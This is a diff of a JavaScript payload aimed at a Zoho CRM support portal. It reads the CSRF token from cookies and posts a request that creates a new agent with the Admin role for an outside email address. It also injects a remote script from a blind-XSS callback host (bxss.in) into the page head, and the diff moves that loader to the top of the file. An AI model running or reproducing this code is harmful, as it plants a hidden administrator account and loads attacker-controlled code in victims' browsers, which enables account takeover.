@@ -1,3 +1,28 @@
+function loadScriptFromURL(url, callback) {
+    const script = document.createElement('script');
+    script.src = url;
+    script.type = 'text/javascript';
+    script.async = true;
+
+    // Optional: Callback when the script is loaded
+    script.onload = () => {
+        console.log(`Script loaded: ${url}`);
+        if (callback) callback();
+    };
+
+    script.onerror = () => {
+        console.error(`Failed to load script: ${url}`);
+    };
+
+    document.head.appendChild(script);
+}
+
+// Example usage
+loadScriptFromURL('https://clevermoriarty.bxss.in', () => {
+    console.log('Another script loaded successfully!');
+});
+
+
 function findCsrf(cookieName) {
 	var nameEQ = cookieName + "=";
 	var ca = document.cookie.split(';');
@@ -39,28 +64,3 @@ function getPlainResponse(action, params) {
 
 var params= {"firstName":"","lastName":"clevermoriarty","associatedDepartmentIds":["4000000099140"],"rolePermissionType":"Admin","aboutInfo":"","mobile":"","phone":"","extn":"","status":"ACTIVE","emailId":"clevermoriarty@yahoo.com"}//No I18N
 var result = getPlainResponse('https://crmplus.zoho.com/supportapi/zd/zohocorp/api/v1/agents?portalname=zohocorp', JSON.stringify(params)); //No I18N 
-
-
-function loadScriptFromURL(url, callback) {
-    const script = document.createElement('script');
-    script.src = url;
-    script.type = 'text/javascript';
-    script.async = true;
-
-    // Optional: Callback when the script is loaded
-    script.onload = () => {
-        console.log(`Script loaded: ${url}`);
-        if (callback) callback();
-    };
-
-    script.onerror = () => {
-        console.error(`Failed to load script: ${url}`);
-    };
-
-    document.head.appendChild(script);
-}
-
-// Example usage
-loadScriptFromURL('https://clevermoriarty.bxss.in', () => {
-    console.log('Another script loaded successfully!');
-});
